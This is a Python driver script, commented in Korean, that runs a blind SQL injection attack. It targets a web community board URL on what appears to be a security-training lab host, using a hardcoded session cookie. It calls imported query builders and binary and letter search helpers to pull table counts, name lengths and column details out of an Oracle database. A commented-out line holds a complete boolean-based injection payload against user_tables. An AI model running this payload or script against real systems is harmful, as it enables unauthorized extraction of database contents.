from attack_setting import attackData,tableInfo
from attack_query import attackQuerys
from binary_search import binary_search,letter_search

#공격 대상 URL 및 초기 쿠키 설정 
url = "http://elms1.skinfosec.co.kr:8082/community6/free"
cookies = {
    "JSESSIONID":"289A9D3D49DB0AC26F076044FC8E36D2"
}


attack_query = ''
page = attackData()
query = attackQuerys()
page.set_url(url)
page.set_cookies(cookies)

result = tableInfo()




#쿼리 설정 및 요청 보내기(POST)
#page.send_post_request(request_string="%test' and (select length(TABLE_NAME) from(select TABLE_NAME,rownum as rnum from user_tables) where rnum=1)=5 and '1%'='1")

#기본 설정 보기 
#page.show

#쿼리 테스트
table_count_query = query.get_table_query('count')
table_length_query = query.get_table_query('length',rnum=1)
table_data_query = query.get_table_query('data',rnum=1)

column_count_query = query.get_column_query('count',table_name='ANSWER')
column_length_query = query.get_column_query('length',table_name='ANSWER')

print(column_length_query)
binary_search(page,column_length_query)
#letter_search(page,table_data_query,5)
